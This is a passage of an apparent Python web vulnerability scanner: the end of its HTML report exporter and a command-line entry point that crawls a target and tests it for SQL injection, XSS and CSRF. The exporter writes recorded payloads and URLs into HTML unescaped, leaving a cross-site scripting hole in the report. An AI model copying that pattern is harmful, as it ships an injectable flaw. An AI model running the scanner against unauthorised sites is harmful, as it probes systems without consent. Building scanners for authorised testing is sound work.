        result.total_forms_found,
        len(result.vulnerabilities),
        sqli_count, xss_count, csrf_count
    )
    
    for i, page in enumerate(result.pages, 1):
        tech = ", ".join(page.tech_stack) if page.tech_stack else "N/A"
        html += f"""<tr><td>{i}</td><td><a href="{page.url}" style="color: #4fc3f7;">{page.url[:60]}</a></td>
                    <td>{page.title[:50]}</td><td>{page.status_code}</td>
                    <td>{len(page.forms)}</td><td>{tech}</td></tr>"""
    
    html += """</table></div>
        <h2>Vulnerabilities</h2>
    """
    
    if not result.vulnerabilities:
        html += "<p style='color: #00cc00;'>No vulnerabilities found.</p>"
    else:
        for vuln in result.vulnerabilities:
            vuln_class = f"vuln-{vuln.severity.lower()}"
            html += f"""<div class="{vuln_class}">
                <h3>{vuln.type} <span class="badge badge-{vuln.severity.lower()}">{vuln.severity}</span></h3>
                <p><strong>URL:</strong> {vuln.url}</p>
                <p><strong>Parameter:</strong> {vuln.parameter}</p>
                <p><strong>Payload:</strong> <code>{vuln.payload}</code></p>
                <p><strong>Evidence:</strong> {vuln.evidence}</p>
                <p><strong>Remediation:</strong> {vuln.remediation}</p>
            </div>"""
    
    html += """</div></body></html>"""
    
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)
    print(f"{Fore.GREEN}[✓] HTML report exported to {filename}")


# ==================== USAGE EXAMPLES ====================

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print(f"{Fore.YELLOW}Usage: python scanner.py <target_url> [options]")
        print(f"{Fore.YELLOW}Options:")
        print(f"  --skip-time    Skip time-based SQLi tests")
        print(f"  --depth N      Set crawl depth (default: 2)")
        print(f"  --threads N    Set thread count (default: 10)")
        print(f"  --json FILE    Export results to JSON")
        print(f"  --html FILE    Export results to HTML")
        sys.exit(1)
    
    target_url = sys.argv[1]
    skip_time = "--skip-time" in sys.argv
    depth = 2
    threads = 10
    json_file = None
    html_file = None
    
    for i, arg in enumerate(sys.argv):
        if arg == "--depth" and i + 1 < len(sys.argv):
            depth = int(sys.argv[i + 1])
        elif arg == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
        elif arg == "--json" and i + 1 < len(sys.argv):
            json_file = sys.argv[i + 1]
        elif arg == "--html" and i + 1 < len(sys.argv):
            html_file = sys.argv[i + 1]
    
    scanner = WebScanner(
        target_url=target_url,
        max_depth=depth,
        threads=threads,
        skip_time_based=skip_time,
    )
    
    result = scanner.scan()
    
    # Print vulnerability details
    print_vulnerability_details(result)
    
    # Export if requested
    if json_file:
        export_results_to_json(result, json_file)
    
    if html_file:
        export_results_to_html(result, html_file)
